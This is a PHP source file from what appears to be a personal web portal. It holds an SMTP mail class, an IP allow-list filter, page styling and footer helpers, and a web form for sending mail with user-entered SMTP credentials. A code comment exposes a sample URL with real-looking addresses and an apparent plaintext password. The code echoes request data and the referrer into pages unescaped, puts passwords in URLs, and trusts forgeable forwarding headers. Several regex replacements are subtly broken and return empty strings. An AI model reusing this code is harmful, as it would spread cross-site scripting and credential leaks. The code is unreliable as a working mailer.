        if (!$this->smtp_putcmd("MAIL", "FROM:<".$from.">")) 
        { 
                return $this->smtp_error("sending MAIL FROM command"); 
        } 
        if (!$this->smtp_putcmd("RCPT", "TO:<".$to.">")) 
        { 
                return $this->smtp_error("sending RCPT TO command"); 
        } 
        if (!$this->smtp_putcmd("DATA")) 
        { 
                return $this->smtp_error("sending DATA command"); 
        } 
        if (!$this->smtp_message($header, $body)) 
        { 
                return $this->smtp_error("sending message"); 
        } 
        if (!$this->smtp_eom()) 
        { 
                return $this->smtp_error("sending <CR><LF>.<CR><LF> [EOM]"); 
        } 
        if (!$this->smtp_putcmd("QUIT")) 
        { 
                return $this->smtp_error("sending QUIT command"); 
        } 
        
        return TRUE; 
} 

function smtp_sockopen($address) 
{ 
        if ($this->relay_host == "") 
        {
                return $this->smtp_sockopen_mx($address); 
        } 
        else 
        { 
                return $this->smtp_sockopen_relay(); 
        } 
} 

function smtp_sockopen_relay() 
{
        $this->log_write("<br>Trying to ".$this->relay_host.":".$this->smtp_port."<br>"); 
        $this->sock = @fsockopen($this->relay_host, $this->smtp_port, $errno, $errstr, $this->time_out); 
        if (!($this->sock && $this->smtp_ok())) 
        { 
                $this->log_write("Error: Cannot connenct to relay host ".$this->relay_host."<br>"); 
                $this->log_write("Error: ".$errstr." (".$errno.")<br>"); 
                return FALSE; 
        } 
        $this->log_write("Connected to relay host ".$this->relay_host."\n"); 
        return TRUE;
} 

function smtp_sockopen_mx($address) 
{ 
        $domain = ereg_replace("^.+@([^@]+)$", "", $address); 
        if (!@getmxrr($domain, $MXHOSTS)) 
        { 
                $this->log_write("Error: Cannot resolve MX \"".$domain."\"<br>"); 
                return FALSE; 
        } 
        foreach ($MXHOSTS as $host) 
        { 
                $this->log_write("Trying to ".$host.":".$this->smtp_port."<br>"); 
                $this->sock = @fsockopen($host, $this->smtp_port, $errno, $errstr, $this->time_out); 
                if (!($this->sock && $this->smtp_ok())) 
                { 
                        $this->log_write("Warning: Cannot connect to mx host ".$host."\n"); 
                        $this->log_write("Error: ".$errstr." (".$errno.")<br>"); 
                        continue; 
                } 
                $this->log_write("Connected to mx host ".$host."\n"); 
                return TRUE; 
        } 
        $this->log_write("Error: Cannot connect to any mx hosts (".implode(", ", $MXHOSTS).")\n"); 
        return FALSE; 
} 

function smtp_message($header, $body) 
{ 
        fputs($this->sock, $header."\r\n".$body); 
        $this->smtp_debug("> ".str_replace("\r\n", "\n"."> ", $header."\n> ".$body."\n> ")); 
        return TRUE; 
} 

function smtp_eom() 
{ 
        fputs($this->sock, "\r\n.\r\n"); 
        $this->smtp_debug(". [EOM]\n"); 
        return $this->smtp_ok(); 
} 

function smtp_ok() 
{ 
        $response = str_replace("\r\n", "", fgets($this->sock, 512)); 
        $this->smtp_debug($response."\n"); 
        if (!ereg("^[23]", $response)) 
        { 
                fputs($this->sock, "QUIT\r\n"); 
                fgets($this->sock, 512); 
                $this->log_write("Error: Remote host returned \"".$response."\"\n"); 
                return FALSE; 
        } 
        return TRUE; 
} 

function smtp_putcmd($cmd, $arg = "") 
{ 
        if ($arg != "") 
        { 
                if($cmd=="") $cmd = $arg; else $cmd = $cmd." ".$arg; 
        } 
        fputs($this->sock, $cmd."\r\n"); 
        $this->smtp_debug("> ".$cmd."\n"); 
        return $this->smtp_ok(); 
} 

function smtp_error($string) 
{ 
        $this->log_write("Error: Error occurred while ".$string.".\n");
        return FALSE; 
} 

function log_write($message) 
{ 
        $this->smtp_debug($message); 
        if ($this->log_file == "") 
        { 
                return TRUE; 
        } 
        $message = date("M d H:i:s ",time()+3600*8).get_current_user()."[".getmypid()."]: ".$message; 
        if (!@file_exists($this->log_file) || !($fp = @fopen($this->log_file, "a"))) 
        { 
                $this->smtp_debug("Warning: Cannot open log file \"".$this->log_file."\"\n"); 
                return FALSE;
        } 
        flock($fp, LOCK_EX); 
        fputs($fp, $message); 
        fclose($fp); return TRUE; 
} 

function strip_comment($address) 
{ 
        $comment = "\([^()]*\)"; 
        while (ereg($comment, $address)) 
        { 
                $address = ereg_replace($comment, "", $address); 
        } 
        return $address; 
} 

function get_address($address) 
{ 
        $address = ereg_replace("([ \t\r\n])+", "", $address); 
        $address = ereg_replace("^.*<(.+)>.*$", "", $address); 
        return $address; 
} 

function smtp_debug($message) 
{ 
        if ($this->debug) 
        { 
                echo $message; 
        } 
} 

} 

?> 

<?php 
class IPFilter
{
        function IPFilter($ipstr) {
                $this->ipstr = $ipstr;
        }
        
        function IPlimiter() {
				$ipallow = ""; 
      
               return $ipallow;
        }

function get_real_ip()
{
$ip=false;
if(!empty($_SERVER["HTTP_CLIENT_IP"])){
  $ip = $_SERVER["HTTP_CLIENT_IP"];
}
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
  $ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
  if($ip){
   array_unshift($ips, $ip); $ip = FALSE;
  }
  for($i = 0; $i < count($ips); $i++){
   if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])){
    $ip = $ips[$i];
    break;
   }
  }
}
return($ip ? $ip : $_SERVER['REMOTE_ADDR']);
}
       
        function CheckIP() {
        //print_r($_SERVER);
                //if (trim($_SERVER['REMOTE_ADDR']) != ''){
                //        $ip = trim($_SERVER['REMOTE_ADDR']);
                //}
                //elseif (stripos($_SERVER['HTTP_X_FORWARDED_FOR'],',') !== false){
                //        $ip = substr(trim($_SERVER['HTTP_X_FORWARDED_FOR']),0,stripos($_SERVER['HTTP_X_FORWARDED_FOR'], ','));
                //}
                //elseif (stripos($_SERVER['HTTP_X_FORWARDED_FOR'],';') !== false){
                //        $ip = substr(trim($_SERVER['HTTP_X_FORWARDED_FOR']),0,stripos($_SERVER['HTTP_X_FORWARDED_FOR'], ';'));
                //}
                //else{
                //        $ip = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
                //}

                $ip = $this->get_real_ip();
                
                if (stripos($this->ipstr,'|') != '0' )
                	$iparray = split('[|]',$this->ipstr);
                else
                	$iparray['0'] = $this->ipstr;
                $flag = '0';
                for ($i = 0; $i < count($iparray); $i++) {
                        if ($iparray[$i] == $ip || $iparray[$i] == $servername){
                                $flag = '1';
                        }
                        elseif ((count(split('[.]',$iparray[$i])) < 4)||(strripos($iparray[$i],'.') == (strlen($iparray[$i])-1))){
                                if (strripos($ip,$iparray[$i]) === 0){
                                        $flag = '1';
                                }
                        }
                        elseif (stripos($iparray[$i],'<>') != '0' ){
                                $tellipstr = split('<>',$iparray[$i]);
                                if ((max($this->ip2num($tellipstr[0]),$this->ip2num($tellipstr[1]),$this->ip2num($ip)) > $this->ip2num($ip)) && (min($this->ip2num($tellipstr[0]),$this->ip2num($tellipstr[1]),$this->ip2num($ip)) < $this->ip2num($ip))){
                                        $flag = '1';
                                }
                        }
                        if ($flag == '1'){
                                return array('ok',$iparray[$i]); 
                        }
                        elseif ($flag == '0'){
                        }
                }
                return array('',$ip);
        }
    
        function ip2num($ipstring){
                $ipstr = split("[.]", $ipstring); 
                for ($v = 0 ; $v < count($ipstr) ; $v++){
                        if (strlen($ipstr[$v]) < 3){
                                if (strlen($ipstr[$v]) == '1'){
                                        $ipstr[$v] = "00" . $ipstr[$v];
                                }       
                                elseif (strlen($ipstr[$v]) == '2'){
                                        $ipstr[$v] = "0" . $ipstr[$v];
                                }       
                        }
                }
                return ($ipstr[0].'.'.$ipstr[1].'.'.$ipstr[2].'.'.$ipstr[3]);   
        }
}

class css{

function css(){
}

function selcss($tdtbg,$tdbg,$others){
?>
<style>
        td { font-size: 12px; align:center;valign:middle;} .tdtbg { align:center;valign:middle;background-color: <?php  echo $tdtbg ?>; color:#0000000; } .tdbg { align:center;valign:middle;background-color: <?php  echo $tdbg ?>; }input.text { font-size:12px; color: #000000; background-color: ; border: 1px <?php  echo $others ?> solid; }textarea.text { font-size:12px; color: #000000; background-color: #ffffff; border: 1px <?php  echo $others ?> solid; } select.text { font-size:12px; color: #000000; background-color: <?php  echo $others ?>; border: 1px #3366cc solid;} .button{font-family: "Tahoma", "宋体"; font-size: 11px; color: #000000;border: 1px <?php  echo $others ?> solid; background-color: <?php  echo $tdbg ?>;CURSOR: hand;font-style: normal ;}.title { font-size: 12px; font-family: 黑体; color: #000; } .tborder { BORDER: <?php  echo $others ?> 1px solid; } .tgborder { BORDER: <?php  echo $tdbg ?> 1px solid;cursor:pointer }  A:link { color:#000000; text-decoration:none; } A:visited { color:#000000; text-decoration:none; } A:hover { color:#000000; text-decoration:underline; } A.hotexamA:link { color:#000000; text-decoration:none; } A.hotexamA:visited { color:#000000; text-decoration:none; } A.hotexamA:hover { color:#000000; text-decoration:underline; } body {background-color: #ffffff;color:#000000;scrollbar-base-color:<?php  echo $others ?>} 
</style>
<?php       
}
        
function ico(){
if(!file_exists('./X3193.ico')){
        if (icon()=='ok'){
                ?><link rel="Bookmark" href="<?php  echo httppathdir() ?>X3193.ico">
                <link rel="Shortcut Icon" href="<?php  echo httppathdir() ?>X3193.ico">
                <?php 
        }
}
else{
        ?><link rel="Bookmark" href="<?php  echo httppathdir() ?>X3193.ico">
        <link rel="Shortcut Icon" href="<?php  echo httppathdir() ?>X3193.ico">
        <?php 
}
?>
<meta name="google-translate-customization" content="3bc603e5906b155a-27172a03263b5606-g1066c753d40349bf-9"></meta>
<?php 

}

function title($titlestr){
?>
<title><?php  echo $titlestr; ?></title>
<?php 
}

function configrequest($fullurl,$requeststr,$requestvalue){
if (stripos($fullurl,$requeststr."=") == true){
        if (stripos($fullurl,"&",stripos($fullurl,$requeststr."=")) == true){
                echo str_replace(substr($fullurl,stripos($fullurl,$requeststr."="),(stripos($fullurl,"&",stripos($fullurl,$requeststr."="))-stripos($fullurl,$requeststr."="))),$requeststr."=".$requestvalue,$fullurl);
                //echo '1';
        }       
        elseif (stripos($fullurl,"&",stripos($fullurl,$requeststr."=")) == FALSE){
                echo str_replace(substr($fullurl,stripos($fullurl,$requeststr."=")),$requeststr."=".$requestvalue,$fullurl);
                //echo '2';
        }       
}       
elseif (stripos($fullurl,"=") == FALSE){
        echo $fullurl.$requeststr."=".$requestvalue;
        //echo '3';
}       
elseif (stripos($fullurl,$requeststr."=") == FALSE){
        echo $fullurl."&".$requeststr."=".$requestvalue;
        //echo '4';
        
}
else
        echo '5';
        
}

function textarea($mouseoverbgcolor,$mouseoutbgcolor){
?>onmouseover="this.style.backgroundColor='<?php  echo $mouseoverbgcolor ;?>';" onmouseout="this.style.backgroundColor='<?php  echo $mouseoutbgcolor; ?>';" onmousedown="this.style.backgroundColor='<?php echo $mouseoverbgcolor;?>';"<?php 
}

function selectarea($mouseoverbgcolor,$mouseoutbgcolor){
}

function footer(){
$skincolor = selstyle(trim(request("skin")));
?><table width="90%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" height="30">
                <?php  date_default_timezone_set('UTC');?>
                <?php 
                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                ?>
                <div class="addthis_toolbox addthis_default_style">       
                       	<?php  echo "Hosted by ".strtoupper($_SERVER["SERVER_NAME"])." ".date("Y-m-d");?>
                        <a style='color:#000000' href="skype:+990009369991439853" target='_blank'><?php echo formatchar('呼我');?></a>

                </div>
                <?php 
                }
                else{
                	if (!is_wap()){
                ?>
                <noscript>                
                <div class="addthis_toolbox addthis_default_style" align='center'>
                                <div id="google_translate_element"></div><script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'zh-CN', layout: google.translate.TranslateElement.InlineLayout.HORIZONTAL, multilanguagePage: true}, 'google_translate_element');
}
</script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
              </noscript>  
                <table>
                        <tr>
                                <td>
                        		<?php  echo "Hosted by ".strtoupper($_SERVER["SERVER_NAME"])." ".date("Y-m-d");?>
                                </td>
                                <td height="30">
                                        <noscript>
                                        <script type="text/javascript">var addthis_config = {"data_track_clickback":true};</script>
                                        <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid=x3193"></script>
                                        </noscript>
                                        <?php 
                                        if($skincolor=='gold'){
                                        	$img = '0';
                                        }
                                        elseif($skincolor=='green'){
                                        	$img = '1';
                                        }
                                        elseif($skincolor=='blue'){
                                        	$img = '6';
                                        }
                                        elseif($skincolor=='purple'){
                                        	$img = '7';
                                        }
                                        elseif($skincolor=='red'){
                                        	$img = '4';
                                        }
                                        elseif($skincolor=='black'){
                                        	$img = '3';
                                        }                                                                                                                                                                ?>
                                        <!-- Baidu Button BEGIN -->
<script type="text/javascript" id="bdshare_js" data="type=slide&amp;mini=1&amp;img=<?php echo $img;?>&amp;uid=684859" ></script>
<script type="text/javascript" id="bdshell_js"></script>
<script type="text/javascript">
	document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + new Date().getHours();
</script>
<!-- Baidu Button END -->
		                                    <a style='color:#000000' href="http://www.addthis.com/bookmark.php?v=250&amp;pubid=x3193" class="addthis_button_compact" target="_blank"><?php echo formatchar('分享');?></a>
                                        <a style='color:#000000' href="skype:+990009369991439853"><?php echo formatchar('呼我');?></a>

                                        

                                </td>                                        
                        </tr>
                </table>  
                <noscript>
                                         <div align='center'>
<script type="text/javascript">
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F3127873a3c633cebeeedb5861d582211' type='text/javascript'%3E%3C/script%3E"));
</script>
																				</DIV>                              
                </noscript>
                </div>
                <?php 
                	}
                	else{

                ?>
                
                <table>
                        <tr>
                                <td>

                        		<?php  echo "Hosted by ".strtoupper($_SERVER["SERVER_NAME"])." ".date("Y-m-d");?>
                                </td>
                                <td height="30"> 
                                        <a style='color:#000000' href="http://www.addthis.com/bookmark.php?v=250&amp;pubid=x3193" class="addthis_button_compact" target="_blank"><?php echo formatchar('分享');?></a>
                                        <a style='color:#000000' href="ext:tel/+85258083882"><?php echo formatchar('呼我');?></a>
                                </td>                                        
                        </tr>
                </table>  
<?php  
//require("hm.php");
$_hmt = new _HMT("3127873a3c633cebeeedb5861d582211");
$_hmtPixel = $_hmt->trackPageView();
?>

                </div>
                <?php 
		
                	}
                }
                ?>
                </td>
        </tr>   
</table>
<?php 
}

}
?>

<?php 
function smtp() {
// http://server/?api=smtp&server=smtp.163.com&port=25&sname=X3193&semail=xcy6272003@163.com&spwd=EUIfgwe7&rname=X3193&remail=xcy6272003@126.com&bodytype=HTML&timeout=300&cc=xcy6272003@126.com&content=jjjjjjjjjjjjjj<br>jjjjjjjjj<div>jjjjjj</div>&subject=66666666666666&bcc=xcy6272003@126.com&aheader=&timeout=300
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - SMTP");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 
switch (trim(request('action'))) {  // case start
        case "sendmail":
                        //echo encodeuri(trim($_SERVER['HTTP_REFERER']));
                        //return;
                        if (trim(request('server'))=="" || trim(request('semail'))=="" || trim(request('remail'))=="" || trim(request('semail'))=="" || trim(request('spwd'))==""){
                                AlertBack ("信息填写不完全！" ,1);
                        }
                        //print_r($_POST);
                        //return;
                        $smtpserver = trim(request('server'));
                        //SMTP服务器 
                        $smtpserverport =trim(request('port'));
                        //SMTP服务器端口 
                        $smtpusermail = trim(request('semail'));
                        //SMTP服务器的用户邮箱 
                        $smtpemailto = trim(request('remail'));
                        $smtpemailtoname = trim(request('rname'));
                        //发送给谁 
                        $smtpuser = trim(request('semail'));
                        $smtpusername = trim(request('sname'));
                        //SMTP服务器的用户帐号 
                        $smtppass = trim(request('spwd'));
                        //SMTP服务器的用户密码 
                        $mailsubject = trim(request('subject'));
                        //邮件主题 
                        $mailbody = iconv("utf-8","gb2312",decodeuri(trim(request('content'))));
                        //邮件内容 
                        $mailtype = trim(request('bodytype'));
                        //邮件格式（HTML/TXT）,TXT为文本邮件 
                        $cc = trim(request('cc')) ; 
                        $bcc = trim(request('bcc')) ; 
                        $additional_headers = trim(request('aheader'));
                        $timeout = trim(request('timeout'));
                        ########################################## 
                        $smtp = new smtp($smtpserver,$smtpserverport,true,$smtpuser,$smtppass);
                        //这里面的一个true是表示使用身份验证,否则不使用身份验证. 
                        if (strtolower(trim($_SERVER['SERVER_NAME'])) == "localhost"){
                                $smtp->debug = false;
                        }       
                        elseif (strtolower(trim($_SERVER['SERVER_NAME'])) == "web.x3193.cz.cc"){
                                $smtp->debug = false;
                        }
                        //是否显示发送的调试信息 
                        if ($smtp->sendmail($smtpemailto,$smtpemailtoname, $smtpuser,$smtpusername, $mailsubject, $mailbody, $mailtype, $cc, $bcc, $additional_headers,$timeout)){
                                $timeout = "5000";
                                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        电子邮件发送成功！<?php  echo $timeout/1000?> 秒后返回上一页                
                </td>
        </tr>   
                                <?php 
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim($_SERVER['HTTP_REFERER'])."\'\",".$timeout.");</script></p>"
                                ?>
</table>                        
                                <?php 
                        }       
                        else
{
                                $timeout = "5000";
                                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                        电子邮件发送失败！<?php  echo $timeout/1000?> 秒后返回上一页                
                </td>
        </tr>   
                                <?php 
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim($_SERVER['HTTP_REFERER'])."\'\",".$timeout.");</script></p>"
                                ?>
</table>                        
                                <?php 
                        }       
                        break;
        case "createmail":
                        if (trim(request("logout")) != ""){
                                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                session_register("smtp");
}                                 

                                $_SESSION["smtp"]=array('uname' => '', 'pwd' => '','server' => '', 'port' => '');                               
                                //session_register("uname"); 
                                //$_SESSION["uname"] = "";      
                                //session_register("pwd"); 
                                //$_SESSION["pwd"] = "";        
                                redirect(scriptpath()."?api=smtp&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                break;
                        }
                        elseif (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                                If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                        if (trim(request("checkcode")) != ""){
                                                AlertBack("四位验证码错误！" , 1);
                                                break;
                                        }       
                                        elseif (trim(request("checkcode")) == ""){
                                                AlertBack("四位验证码为空！" , 1);
                                                break;
                                        }               
                                }
                                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                session_register("smtp");
} 
                                $_SESSION["smtp"]=array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")),'server' => trim(request("server")), 'port' => trim(request("port")));                         
                                //session_register("uname"); 
                                //$_SESSION["uname"] = trim(request("uname"));  
                                //session_register("pwd"); 
                                //$_SESSION["pwd"] = trim(request("pwd"));      
                                //session_register("server"); 
                                //$_SESSION["server"] = trim(request("server"));        
                                //session_register("port"); 
                                //$_SESSION["port"] = trim(request("port"));    
                                redirect(scriptpath()."?api=smtp&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(base64_encode(trim($_POST["pwd"])))."&server=".encodeuri(base64_encode(trim($_POST["server"])))."&port=".trim($_POST["port"])."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        } 
                        elseif ($_SESSION["smtp"]["uname"] != "" && $_SESSION["smtp"]["pwd"] != "" && $_SESSION["smtp"]["server"] != "" && $_SESSION["smtp"]["port"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == "" && trim(request("server")) == "" && trim(request("port")) == ""){
                                redirect(scriptpath()."?api=smtp&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["smtp"]["uname"])))."&pwd=".encodeuri(base64_encode(trim($_SESSION["smtp"]["pwd"])))."&server=".encodeuri(base64_encode(trim($_SESSION["smtp"]["server"])))."&port=".encodeuri(base64_encode(trim($_SESSION["smtp"]["port"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                break;
                        }       
                        elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                redirect(scriptpath()."?api=smtp&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                break;
                        }
                        ?>
<table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<FORM ACTION="<?php echo scriptpath()."?api=smtp&action=sendmail&skin=".$skincolor;?>" METHOD=POST NAME="smtp">
        <tr class="tdtbg">
                <td align="left">
                        &nbsp接收方地址信息：
                </td>
        </tr>   
</table>

<table width="95%" height="70" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" width="20%">
                        收方呢称：
                </td>
                <td align="center" width="80%">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="rname" value="" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        收方地址：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="remail" value="" />
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%" height="5">
                </td>
        </tr>   
</table>

<table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">
                        &nbsp发送方SMTP服务器信息：
                </td>
        </tr>   
</table>

<table width="95%" height="159" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" width="20%">
                        SMTP域名：
                </td>
                <td align="center" width="80%">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="server" maxlength="" value="<?php echo base64_decode(trim(request("server")));?>" />
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="hidden" name="bodytype" maxlength="" value="html" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        SMTP端口：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="port" maxlength="" value="<?php echo trim(request("port"));?>" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        SMTP昵称：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="sname" value="" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        SMTP地址：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="semail" value="<?php echo base64_decode(trim(request("uname")));?>" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        SMTP密码：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="password" name="spwd" value="<?php echo base64_decode(trim(request("pwd")));?>" />
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%" height="5">
                </td>
        </tr>   
</table>
<table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">
                        &nbsp抄送方地址信息：
                </td>
        </tr>   
</table>

<table width="95%" height="70" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" width="20%">
                        抄方地址：
                </td>
                <td align="center" width="80%">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="cc" value="" maxlength="" />
                </td>
        </tr>   
        <tr>
                <td align="center">
                        密抄地址：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px" type="text" name="bcc" value="" maxlength="" />
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="center" width="40%" height="5">
                </td>
        </tr>   
</table>
<table width="95%" height="35" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left">
                        &nbsp邮件详细内容：
                </td>
        </tr>   
</table>
<table width="95%" height="170" align="center" valign="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" width="20%" height="40">
                        邮件主题：
                </td>
                <td align="center" width="80%">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:90%;height:22px;" type="text" id="subject" name="subject" maxlength="" value="" />
                </td>
        </tr>   
        <tr>
                <td align="center" height="40">
                        验证码：
                </td>
                <td align="center">
                        <input onmouseover="this.style.backgroundColor='#FCFC9D';" onmouseout="this.style.backgroundColor='';" onmousedown="this.style.backgroundColor='#FCFC9D';"
 style="width:80%;height:22px" type="text" maxlength="4" id="checkcode" name="checkcode" maxlength="4" onKeyUp="value=value.replace(/[^0-9,]/g,'')" value="" />
                        &nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="13" src="?api=checkcode" border="0"></a>
                </td>
        </tr>   
        <tr>
                <td align="center" valign="top">
                        邮件内容：
                </td>
                <td align="center" width="80%">
                <?php 
                $editor = new editor_class;
                $editor->editorCSS();
                $editor->editorLoad();
                $editor->editorControl("smtp");
                $editor->editorMain("smtp",scriptpath()."?api=smtp&action=sendmail&skin=".$skincolor,"90%","");
                ?>
                </td>
        </tr>   
</table>        
                        <?php                       
                break;  
        default:
                        ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="google">
                        <form action="<?php echo ScriptPath();?>?api=smtp&action=createmail&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="smtp">
                        &nbsp服务器：<input type="text" class="text" name="server" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>> 
                        &nbsp端口：<input type="text" class="text" name="port" value="" style="height:20px;width:4%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
